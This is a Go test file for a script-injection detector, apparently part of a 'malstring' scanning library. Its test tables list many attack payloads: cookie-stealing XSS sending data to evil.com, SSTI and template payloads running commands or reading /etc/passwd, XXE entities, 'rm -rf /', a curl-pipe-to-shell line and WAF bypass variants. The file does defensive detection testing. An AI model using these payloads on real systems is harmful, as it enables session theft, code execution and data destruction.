package test

import (
	"strings"
	"testing"
	"time"

	"github.com/Lands-Horizon-Corp/malstring/detectors"
)

func TestNewScriptInjection(t *testing.T) {
	detector := detectors.NewScriptInjection()
	if detector == nil {
		t.Fatal("NewScriptInjection() returned nil")
	}
}

func TestScriptInjectionDetector_Name(t *testing.T) {
	detector := detectors.NewScriptInjection()
	if detector.Name() != "script_injection" {
		t.Errorf("Expected name 'script_injection', got '%s'", detector.Name())
	}
}

func TestScriptInjectionDetector_BasicDetection(t *testing.T) {
	detector := detectors.NewScriptInjection()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// Positive cases - should detect script injection
		{"Basic script tag", "<script>alert('xss')</script>", true},
		{"Script with attributes", "<script type='text/javascript'>alert(1)</script>", true},
		{"JavaScript protocol", "javascript:alert(document.cookie)", true},
		{"JavaScript protocol with spaces", "javascript: alert(1)", true},
		{"Event handler onload", "<img onload=\"alert('xss')\" src=x>", true},
		{"Event handler onclick", "<div onclick=\"malicious()\">Click</div>", true},
		{"Event handler onmouseover", "<span onmouseover='alert(1)'>Hover</span>", true},
		{"Event handler onfocus", "<input onfocus='alert(1)' type=text>", true},
		{"Event handler onblur", "<input onblur=\"alert('xss')\" type=text>", true},
		{"Event handler onchange", "<select onchange='alert(1)'><option>1</option></select>", true},
		{"Event handler onsubmit", "<form onsubmit='alert(1)'></form>", true},
		{"Eval function", "eval('alert(1)')", true},
		{"Eval with user input", "eval(userInput)", true},
		{"setTimeout function", "setTimeout('alert(1)', 1000)", true},
		{"setTimeout with function", "setTimeout(function(){alert(1)}, 100)", true},
		{"setInterval function", "setInterval('malicious()', 5000)", true},
		{"Function constructor", "new Function('alert(1)')()", true},
		{"Document write", "document.write('<script>alert(1)</script>')", true},
		{"Document writeln", "document.writeln('malicious content')", true},
		{"Document createElement", "document.createElement('script')", true},
		{"Document getElementById", "document.getElementById('malicious')", true},
		{"Window open", "window.open('http://evil.com')", true},
		{"Window location", "window.location = 'http://evil.com'", true},
		{"Window eval", "window.eval('alert(1)')", true},
		{"Window execScript", "window.execScript('alert(1)')", true},
		{"Img src javascript", "<img src='javascript:alert(1)'>", true},
		{"Iframe src javascript", "<iframe src='javascript:alert(1)'></iframe>", true},
		{"Object data javascript", "<object data='javascript:alert(1)'></object>", true},
		{"Embed src javascript", "<embed src='javascript:alert(1)'>", true},
		{"Form action javascript", "<form action='javascript:alert(1)'></form>", true},
		{"Input src javascript", "<input src='javascript:alert(1)' type=image>", true},
		{"Meta refresh javascript", "<meta http-equiv='refresh' content='0;javascript:alert(1)'>", true},
		{"Link href javascript", "<link href='javascript:alert(1)' rel=stylesheet>", true},
		{"Style expression", "<style>body{background:expression(alert(1))}</style>", true},
		{"Style behavior", "<style>body{behavior:url('#default#userData')}</style>", false}, // Would need specific pattern
		{"Style import javascript", "<style>@import 'javascript:alert(1)'</style>", true},
		{"PHP short tag", "<?= $_GET['cmd'] ?>", true},
		{"PHP tag", "<?php system($_GET['cmd']); ?>", true},
		{"ASP tag", "<% eval request(\"cmd\") %>", true},
		{"ASP equal tag", "<%=request.form(\"cmd\")%>", true},
		{"Handlebars template", "{{user.name}}", true},
		{"Mustache template", "{{user}}", true},
		{"Jinja2 template", "{% for item in items %}{{item}}{% endfor %}", true},
		{"Python exec", "exec('print(\"hello\")')", true},
		{"Python system", "system('ls -la')", true},
		{"Python popen", "popen('cat /etc/passwd')", true},
		{"Python subprocess run", "subprocess.run(['ls', '-la'])", true},
		{"Python subprocess call", "subprocess.call('ls', shell=True)", true},
		{"Python subprocess Popen", "subprocess.Popen(['cat', '/etc/passwd'])", true},
		{"Python eval", "eval('2+2')", true},
		{"Python compile", "compile('print(1)', '<string>', 'exec')", true},
		{"Python execfile", "execfile('/tmp/malicious.py')", true},
		{"Python import", "__import__('os').system('id')", true},
		{"Python getattr", "getattr(__builtins__, 'eval')('print(1)')", true},
		{"OS system", "os.system('rm -rf /')", true},
		{"OS popen", "os.popen('whoami').read()", true},
		{"OS spawn", "os.spawn(os.P_WAIT, '/bin/sh', ['sh'])", true},
		{"OS execv", "os.execv('/bin/sh', ['sh'])", true},
		{"OS execvp", "os.execvp('ls', ['ls', '-la'])", true},
		{"Shell exec", "shell_exec('ls -la')", true},
		{"Passthru", "passthru('cat /etc/passwd')", true},
		{"Template literal", "${7*7}", true},
		{"Template literal complex", "${user.name}", true},
		{"Ruby template", "#{system('whoami')}", true},
		{"SSTI payload", "{{config.items()}}", true},
		{"SSTI class access", "{{''.__class__.__bases__[0]}}", true},
		{"Assert with code", "assert(false, 'alert(1)')", false}, // Would need specific pattern
		{"Create function", "create_function('', 'system($cmd);')", true},
		{"Preg replace with e", "preg_replace('/test/e', 'system($cmd)', $input)", true},
		{"Include with variable", "include($_GET['file'])", true},
		{"Require with variable", "require($userFile)", true},
		{"Require once with variable", "require_once($_POST['lib'])", true},
		{"File get contents with protocol", "file_get_contents('php://input')", true},
		{"File get contents with HTTP", "file_get_contents('http://evil.com/shell.txt')", true},
		{"File put contents with protocol", "file_put_contents('shell.php', file_get_contents('php://input'))", true},
		{"Unserialize", "unserialize($userInput)", true},
		{"Pickle loads", "pickle.loads(data)", true},
		{"YAML load", "yaml.load(userInput)", true},
		{"JSON parse", "JSON.parse(untrustedData)", true},
		{"MongoDB where", "$where: function() { return true; }", true},
		{"MongoDB ne", "{$ne: null}", true},
		{"MongoDB gt", "{age: {$gt: 18}}", true},
		{"MongoDB regex", "{name: {$regex: /admin/}}", true},
		{"LDAP injection", "(&(uid=admin)(password=*))", true},
		{"LDAP or injection", "(|(uid=admin)(uid=user))", true},
		{"LDAP not injection", "(!(uid=admin))", true},
		{"XML DOCTYPE", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", true},
		{"XML ENTITY", "<!ENTITY xxe SYSTEM 'http://evil.com/malicious.dtd'>", true},
		{"XML entity reference", "&xxe;", true},
		{"HTTP Location header", "Location: http://evil.com", false},        // Not inherently dangerous
		{"HTTP Set-Cookie header", "Set-Cookie: admin=true; Path=/", false}, // Not inherently dangerous
		{"HTTP Content-Type header", "Content-Type: text/html\r\n\r\n<script>alert(1)</script>", true},
		{"File inclusion with traversal", "include('../../../etc/passwd')", false}, // Not specifically script injection
		{"Require with traversal", "require('../../config.php')", false},           // Not specifically script injection
		{"Readfile with traversal", "readfile('../sensitive.txt')", true},
		{"File get contents with traversal", "file_get_contents('../../database.config')", true},
		{"EL class access", "${''['class'].forName('java.lang.Runtime')}", true},
		{"EL getClass", "${object.class}", true},
		{"OGNL class access", "#{T(java.lang.Runtime).getRuntime().exec('id')}", true},
		{"Flask SSTI", "{{config['SECRET_KEY']}}", true},
		{"Flask request", "{{request.application}}", true},
		{"Flask session", "{{session.keys()}}", true},
		{"Flask g object", "{{g.user}}", true},
		{"Jinja2 config", "{{config.items()}}", true},
		{"Jinja2 class", "{{''.__class__.__bases__}}", true},
		{"Jinja2 subclasses", "{{''.__class__.__bases__[0].__subclasses__()}}", true},
		{"Jinja2 request", "{% set x = request.application %}", true},
		{"Polyglot javascript", "javascript:/**/alert(1)", true},
		{"Data URI HTML", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", true},
		{"Data URI JavaScript", "data:text/javascript,alert(1)", true},
		{"Data URI Application JS", "data:application/javascript,alert(1)", true},
		{"VBScript protocol", "vbscript:msgbox(1)", true},
		{"Constructor access", "constructor.constructor('alert(1)')()", true},
		{"Prototype pollution", "Object.prototype.isAdmin = true", true},
		{"Proto access", "__proto__.constructor('alert(1)')()", true},
		{"Top frames", "top.frames[0].document", true},
		{"Top window", "top.window.location", true},
		{"Parent frames", "parent.frames[0]", true},
		{"Parent window", "parent.window.document", true},
		{"Parent document", "parent.document.cookie", true},
		{"React dangerously", "dangerouslySetInnerHTML={{__html: userInput}}", true},
		{"Vue v-html", "v-html=\"userInput\"", true},
		{"Angular click binding", "[(click)]=\"maliciousFunction()\"", true},

		// Negative cases - should NOT detect script injection
		{"Normal text", "This is just normal text", false},
		{"Empty string", "", false},
		{"Regular HTML", "<p>Hello world</p>", false},
		{"Normal link", "<a href='https://example.com'>Link</a>", false},
		{"Normal image", "<img src='photo.jpg' alt='Photo'>", false},
		{"CSS without expression", "<style>body{color:red}</style>", false},
		{"Normal PHP comment", "// This is a PHP comment", false},
		{"Normal script reference", "The script ran successfully", false},
		{"Function discussion", "The eval function can be dangerous", false},
		{"Normal template text", "Use templates for rendering", false},
		{"Database query", "SELECT * FROM users", false},
		{"File path", "/home/user/document.txt", false},
		{"URL", "https://www.example.com/page", false},
		{"Email address", "user@example.com", false},
		{"JSON data", "{\"name\": \"John\", \"age\": 30}", false},
		{"XML without DOCTYPE", "Simple XML content here", false},
		{"Normal HTTP response", "HTTP/1.1 200 OK", false},
		{"Programming discussion", "Include files for modular code", false},
		{"System administration", "The system is running normally", false},
		{"Error message", "Execution failed due to timeout", false},
		{"Configuration text", "Set configuration values properly", false},
		{"Documentation", "The document object represents the page", false},
		{"Tutorial text", "JavaScript functions are reusable code blocks", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.Check(tt.input)
			if result != tt.expected {
				t.Errorf("For input '%s', expected %t but got %t", tt.input, tt.expected, result)
			}
		})
	}
}

func TestScriptInjectionDetector_OffensiveSecurityTechniques(t *testing.T) {
	detector := detectors.NewScriptInjection()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// Advanced XSS techniques from penetration testing
		{"DOM-based XSS", "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>", true},
		{"Reflected XSS with encoding", "<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">", true},
		{"Stored XSS payload", "<svg onload=\"fetch('http://evil.com/log?data='+btoa(document.cookie))\">", true},
		{"Filter bypass with HTML entities", "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">", true},
		{"Filter bypass with hex encoding", "<img src=x onerror=\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\">", true},
		{"Filter bypass with unicode", "<img src=x onerror=\"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\">", true},
		{"CSP bypass with JSONP", "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert\"></script>", true},
		{"CSP bypass with data URI", "<object data=\"data:text/html,<script>alert(1)</script>\"></object>", true},
		{"Template injection in Jinja2", "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", true},
		{"Template injection in Twig", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", true},
		{"SSTI in Flask", "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"id\")')}}", true},
		{"SSTI in Django", "{% debug %}", true}, // Django template tag
		{"Freemarker SSTI", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", true},
		{"Velocity SSTI", "#set($ex=$rt.getRuntime().exec(\"id\"))$ex.waitFor()", true}, // Template with exec
		{"Smarty SSTI", "{php}system('id');{/php}", true},                               // PHP tag in template
		{"AngularJS sandbox escape", "{{constructor.constructor('alert(1)')()}}", true},
		{"AngularJS 1.6+ sandbox bypass", "{{$on.constructor('alert(1)')()}}", true},
		{"Vue.js XSS", "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>", true},
		{"React XSS via props", "<Component dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />", true},
		{"Prototype pollution", "Object.prototype.isAdmin = true; admin.isAdmin", true},
		{"DOM clobbering", "<form name=\"getElementById\"><input name=\"valueOf\"></form>", true}, // Form with dangerous names
		{"ASP.NET ViewState", "<%@ Page ViewStateEncryptionMode=\"Never\" %>", false},             // Would need specific pattern
		{"JSP include", "<%@ include file=\"../../etc/passwd\" %>", false},                        // Would need specific pattern
		{"ColdFusion CFINCLUDE", "<cfinclude template=\"../../etc/passwd\">", false},              // Would need specific pattern
		{"PHP LFI via include", "include($_GET['p'].'.php')", true},
		{"PHP RFI", "include('http://evil.com/shell.txt')", false}, // Would need specific pattern
		{"PHP code via preg_replace", "preg_replace('/test/e', $_GET['code'], 'test')", true},
		{"PHP deserialization", "unserialize($_COOKIE['data'])", true},
		{"Python pickle RCE", "pickle.loads(base64.b64decode(user_input))", true},
		{"Python eval with input", "eval(f\"__import__('os').system('{user_cmd}')\")", true},
		{"Python subprocess injection", "subprocess.run(f'ls {user_input}', shell=True)", true},
		{"Ruby ERB injection", "<%= system(params[:cmd]) %>", true}, // Ruby ERB template
		{"Ruby YAML deserialization", "YAML.load(user_input)", true},
		{"Node.js eval", "eval(`const result = ${user_input}`)", true},
		{"Node.js child_process", "require('child_process').exec(user_input)", true},        // Node.js child process
		{"Express template injection", "res.render('template', {data: user_input})", false}, // Would need specific pattern
		{"MongoDB NoSQL injection", "db.users.find({$where: `function() { return this.username == '${username}' }`})", true},
		{"LDAP injection filter bypass", "(&(objectClass=person)(|(cn=*)(cn=admin)))", true},
		{"XXE external entity", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><root>&xxe;</root>", true},
		{"XXE parameter entity", "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/xxe.dtd'>%xxe;]>", true},
		{"XPath injection", "//user[username/text()='admin' or 1=1]/password", true},            // XPath with or condition
		{"XSLT injection", "<xsl:value-of select=\"system-property('java.version')\"/>", false}, // Would need specific pattern
		{"HTTP response splitting", "Set-Cookie: admin=true\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(1)</script>", true},
		{"HTTP header injection", "Location: http://evil.com\\r\\nSet-Cookie: admin=true", false},  // Not inherently dangerous
		{"Log injection", "Username: admin\\nINFO: Admin logged in successfully", false},           // Would need specific pattern
		{"CSV injection", "=cmd|'/c calc'!A0", false},                                              // Would need specific pattern
		{"PowerShell injection", "powershell.exe -c \"Invoke-WebRequest http://evil.com\"", false}, // Would need specific pattern
		{"Bash command substitution", "$(curl http://evil.com/evil.sh | sh)", false},               // Command injection, not script injection
		{"Python f-string injection", "f\"Hello {__import__('os').system('id')}\"", true},
		{"JavaScript template literals", "`${eval('alert(1)')}`", true},
		{"GraphQL injection", "{ user(id: \"1) { password } user(id: \\\"2\") { password } #\") { username } }", false}, // Would need specific pattern
		{"SOAP XML injection", "<soapenv:Body><![CDATA[<script>alert(1)</script>]]></soapenv:Body>", true},
		{"JSON injection", "{\"eval\": \"alert(1)\", \"data\": \"value\"}", false}, // JSON itself isn't dangerous unless eval'd
		{"XML external entity with file", "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>", true},
		{"XML external entity with HTTP", "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/malicious.xml\">]><test>&xxe;</test>", true},
		{"Polyglot XSS payload", "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/`/*\\*/alert(1)//'>", true},
		{"WAF bypass with comments", "<script>/**/alert/**/(/**/1/**/)</script>", true},
		{"WAF bypass with string concatenation", "<script>eval('ale'+'rt(1)')</script>", true},
		{"WAF bypass with encoding", "<script>eval(atob('YWxlcnQoMSk='))</script>", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.Check(tt.input)
			if result != tt.expected {
				t.Errorf("Offensive security test '%s' failed: expected %t, got %t", tt.name, tt.expected, result)
			}
		})
	}
}

func TestScriptInjectionDetector_ReDoSResistance(t *testing.T) {
	detector := detectors.NewScriptInjection()

	// Test patterns that could cause catastrophic backtracking
	tests := []struct {
		name  string
		input string
	}{
		{"Repeated script tags", strings.Repeat("<script>", 1000) + "alert(1)" + strings.Repeat("</script>", 1000)},
		{"Long javascript protocol", "javascript:" + strings.Repeat("a", 5000) + "alert(1)"},
		{"Excessive event handler", "<img " + strings.Repeat("onload=", 500) + "\"alert(1)\">"},
		{"Long eval expression", "eval('" + strings.Repeat("a", 3000) + "')"},
		{"Massive template literal", "${" + strings.Repeat("x", 2000) + "}"},
		{"Long PHP tag", "<?" + strings.Repeat("php ", 1000) + "system('id'); ?>"},
		{"Excessive handlebars", strings.Repeat("{{", 1000) + "user" + strings.Repeat("}}", 1000)},
		{"Long subprocess call", "subprocess.run(['" + strings.Repeat("ls", 1000) + "'])"},
		{"Massive document write", "document.write('" + strings.Repeat("<script>", 500) + "')"},
		{"Long window location", "window.location='" + strings.Repeat("http://evil.com/", 200) + "'"},
		{"Excessive SSTI payload", "{{" + strings.Repeat("config.", 500) + "items()}}"},
		{"Long XML DOCTYPE", "<!DOCTYPE " + strings.Repeat("entity", 500) + " [<!ENTITY xxe 'value'>]>"},
		{"Massive LDAP filter", "(&" + strings.Repeat("(uid=admin)", 500) + ")"},
		{"Long data URI", "data:text/html;base64," + strings.Repeat("abc", 2000)},
		{"Excessive constructor chain", strings.Repeat("constructor.", 500) + "call()"},
		// Advanced catastrophic backtracking patterns
		{"Exponential backtracking nested groups", strings.Repeat("(<script", 200) + strings.Repeat(">)", 200)},
		{"Polynomial backtracking alternations", strings.Repeat("script", 2000) + "X"},
		{"Evil regex pattern with quantifiers", strings.Repeat("a", 3000) + "X"},
		{"Nested HTML structures", strings.Repeat("<div>", 1000) + "alert(1)" + strings.Repeat("</div>", 1000)},
		{"Massive attribute chain", "<img " + strings.Repeat("data-x='y' ", 1000) + "onload='alert(1)'>"},
		{"Complex encoding chains", strings.Repeat("&#97;", 2000)},
		{"JavaScript function overload", strings.Repeat("function(){", 1000) + "alert(1)" + strings.Repeat("}", 1000)},
		{"Template variable explosion", strings.Repeat("{{var", 1000) + "}}" + strings.Repeat("}}", 1000)},
		{"Protocol chain overflow", strings.Repeat("javascript:", 1000)},
		{"Excessive PHP echo", strings.Repeat("<?php echo ", 500) + "'hi'; ?>"},
		{"DOM traversal bomb", strings.Repeat("parent.", 1000) + "document"},
		{"Event handler explosion", strings.Repeat("on", 1000) + "load='alert(1)'"},
		{"Serialization attack", "unserialize('" + strings.Repeat("O:1:", 1000) + "')"},
		{"NoSQL query bomb", strings.Repeat("{$where:", 500) + "1}"},
		{"XSS vector chaining", strings.Repeat("<img src=x onerror=", 500) + "alert(1)>"},
		{"Template engine overload", strings.Repeat("{% for x in ", 300) + "items" + strings.Repeat(" %}", 300)},
		{"JSON structure attack", strings.Repeat("{\"key\":", 1000) + "\"value\"" + strings.Repeat("}", 1000)},
		{"CSS expression bomb", "<style>" + strings.Repeat("expression(", 500) + "alert(1)" + strings.Repeat(")", 500) + "</style>"},
		{"XML entity recursion", strings.Repeat("<!ENTITY e", 500) + " 'value'" + strings.Repeat(">", 500)},
		{"HTTP header repetition", strings.Repeat("Set-Cookie: x=y\\r\\n", 1000)},
		{"LDAP filter nesting", strings.Repeat("(&(", 500) + "uid=admin" + strings.Repeat("))", 500)},
		{"VBScript command chain", "vbscript:" + strings.Repeat("msgbox ", 500) + "1"},
		{"Angular binding explosion", strings.Repeat("{{", 500) + "constructor" + strings.Repeat("}}", 500)},
		{"Vue directive overflow", strings.Repeat("v-html=\"", 500) + "content\""},
		{"React prop bombing", strings.Repeat("dangerouslySetInnerHTML={{", 200) + "__html: 'x'" + strings.Repeat("}}", 200)},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			start := time.Now()

			// Set a timeout to catch potential ReDoS
			done := make(chan bool, 1)
			go func() {
				detector.Check(tt.input)
				done <- true
			}()

			select {
			case <-done:
				duration := time.Since(start)
				if duration > 100*time.Millisecond {
					t.Errorf("ReDoS/Catastrophic backtracking test '%s' took too long: %v", tt.name, duration)
				}
			case <-time.After(100 * time.Millisecond):
				t.Errorf("ReDoS/Catastrophic backtracking test '%s' timed out (potential vulnerability)", tt.name)
			}
		})
	}
}

func TestScriptInjectionDetector_EdgeCases(t *testing.T) {
	detector := detectors.NewScriptInjection()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"Empty script tag", "<script></script>", true},
		{"Script tag with newlines", "<script>\nalert(1)\n</script>", false}, // Might not match with newlines
		{"Case variations", "<SCRIPT>alert(1)</SCRIPT>", true},
		{"Mixed case event", "<img OnLoAd=\"alert(1)\">", true},
		{"Spaces in javascript protocol", "javascript  :  alert(1)", true},
		{"Tab in event handler", "<div onclick\t=\"alert(1)\">", true},
		{"Single quotes in double quotes", "<img onload=\"alert('xss')\">", true},
		{"Double quotes in single quotes", "<img onload='alert(\"xss\")'>", true},
		{"No quotes in event", "<img onload=alert(1)>", true}, // Our pattern might catch this
		{"Incomplete script tag", "<script>alert(1)", false},
		{"Script tag without content", "<script src='evil.js'>", false}, // Might not match without content
		{"Nested script tags", "<script><script>alert(1)</script></script>", true},
		{"Multiple event handlers", "<img onload=\"alert(1)\" onerror=\"alert(2)\">", true},
		{"Event handler with complex code", "<img onload=\"if(1){alert('xss')}\">", true},
		{"JavaScript protocol in iframe", "<iframe src=\"javascript:alert(1)\"></iframe>", true},
		{"Data URI with HTML", "data:text/html,<script>alert(1)</script>", true},
		{"Base64 in data URI", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg", true},
		{"VBScript in IE", "vbscript:MsgBox(1)", true},
		{"PHP tag variations", "<? echo 'hi'; ?>", false}, // Might not match short tags
		{"PHP with equals", "<?= $user ?>", true},
		{"ASP variations", "<% Response.Write(\"hi\") %>", true},
		{"Template with spaces", "{{ user.name }}", true},
		{"Template with filters", "{{user.name|escape}}", true},
		{"Python exec with quotes", "exec(\"print('hello')\")", true},
		{"Nested function calls", "eval(setTimeout('alert(1)', 100))", true},
		{"Constructor chaining", "constructor.constructor('alert(1)')()", true},
		{"Prototype access", "__proto__.constructor('alert(1)')()", true},
		{"Window reference", "top.window.eval('alert(1)')", true},
		{"Parent reference", "parent.document.write('<script>alert(1)</script>')", true},
		{"Complex template injection", "{{''.__class__.__bases__[0].__subclasses__()}}", true},
		{"SSTI with request", "{{request.application.__globals__}}", true},
		{"XML with CDATA", "<![CDATA[<script>alert(1)</script>]]>", true},               // Script tag in CDATA
		{"Entity reference", "&lt;script&gt;alert(1)&lt;/script&gt;", true},             // Entity references detected
		{"URL encoded", "%3Cscript%3Ealert(1)%3C/script%3E", false},                     // URL encoded, would need decoding first
		{"Hex encoded JavaScript", "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", false},  // Would need interpretation
		{"Unicode escaped", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", false}, // Would need interpretation
		{"Partial match edge cases", "scriptable programming", false},
		{"Function name only", "eval", false},
		{"Keyword in string", "The eval function is dangerous", false},
		{"Template syntax in comment", "/* {{user.name}} */", true}, // Still a template syntax
		{"HTML comment with script", "<!-- <script>alert(1)</script> -->", true},
		{"CSS comment with expression", "/* expression(alert(1)) */", true}, // Expression in comment still dangerous
		{"Multi-line template", "{{\nuser.name\n}}", true},
		{"Template with arithmetic", "{{7*7}}", true},
		{"Complex SSTI", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.Check(tt.input)
			if result != tt.expected {
				t.Errorf("Edge case '%s' failed: expected %t, got %t", tt.name, tt.expected, result)
			}
		})
	}
}

func TestScriptInjectionDetector_Performance(t *testing.T) {
	detector := detectors.NewScriptInjection()

	// Test performance with different input sizes
	tests := []struct {
		name string
		size int
	}{
		{"Small input", 100},
		{"Medium input", 1000},
		{"Large input", 10000},
		{"Very large input", 50000},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create input of specified size with script injection
			input := "normal text " + strings.Repeat("a", tt.size) + " <script>alert(1)</script>"

			start := time.Now()
			result := detector.Check(input)
			duration := time.Since(start)

			// Should detect the injection
			if !result {
				t.Errorf("Performance test '%s' failed to detect script injection", tt.name)
			}

			// Should complete within reasonable time
			if duration > 5*time.Millisecond {
				t.Logf("Performance test '%s' took: %v", tt.name, duration)
			}
		})
	}
}

func TestScriptInjectionDetector_FalsePositives(t *testing.T) {
	detector := detectors.NewScriptInjection()

	// Legitimate content that shouldn't be flagged
	legitimateInputs := []string{
		"Please use the script to automate tasks",
		"JavaScript is a programming language",
		"The evaluation process is complete",
		"Execute the plan according to schedule",
		"Include the necessary files",
		"System functionality is working",
		"Function definition completed",
		"Template design guidelines",
		"Document structure is valid",
		"Window cleaning service available",
		"Constructor building materials",
		"Parent company information",
		"Configuration management system",
		"Request processing completed",
		"Session management active",
		"Class schedule updated",
		"Object oriented programming",
		"Data processing application",
		"Expression of interest form",
		"Style guide documentation",
		"Meta information included",
		"Link to external resources",
		"Form submission successful",
		"Input validation completed",
		"Image processing service",
		"Frame construction complete",
		"The script tag is used for JavaScript",
		"Template engines render dynamic content",
		"XML documents use DOCTYPE declarations",
	}

	for _, input := range legitimateInputs {
		result := detector.Check(input)
		if result {
			t.Errorf("False positive detected for legitimate input: %q", input)
		}
	}
}

func TestScriptInjectionDetector_IntegrationWithScanner(t *testing.T) {
	detector := detectors.NewScriptInjection()

	testInputs := []struct {
		input    string
		expected bool
		desc     string
	}{
		{"normal text; <script>alert(1)</script>", true, "XSS injection"},
		{"user=admin&payload=<img onerror='alert(1)' src=x>", true, "Event handler injection"},
		{"clean input without any scripts", false, "Clean input"},
		{"eval('malicious code')", true, "Direct eval injection"},
		{"This is just normal text with no scripts", false, "Normal text"},
		{"user@example.com and some normal data", false, "Normal data"},
		{"template={{user.name}}", true, "Template injection"},
		{"file.php?cmd=<?php system($_GET['x']); ?>", true, "PHP injection"},
	}

	for _, test := range testInputs {
		result := detector.Check(test.input)
		if result != test.expected {
			t.Errorf("Integration test failed for %q (%s): expected %t, got %t",
				test.input, test.desc, test.expected, result)
		}
	}
}

func BenchmarkScriptInjectionDetector_Check(b *testing.B) {
	detector := detectors.NewScriptInjection()
	testInput := "<script>alert(document.cookie)</script> and {{user.__class__.__bases__[0]}} and eval('malicious()')"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		detector.Check(testInput)
	}
}

func TestScriptInjectionDetector_LargeInput(t *testing.T) {
	detector := detectors.NewScriptInjection()

	// Test with large input to ensure no performance issues
	largeInput := ""
	for range 1000 {
		largeInput += "normal text "
	}
	largeInput += "<script>alert('xss')</script>"

	result := detector.Check(largeInput)
	if !result {
		t.Error("Should detect script injection in large input")
	}
}
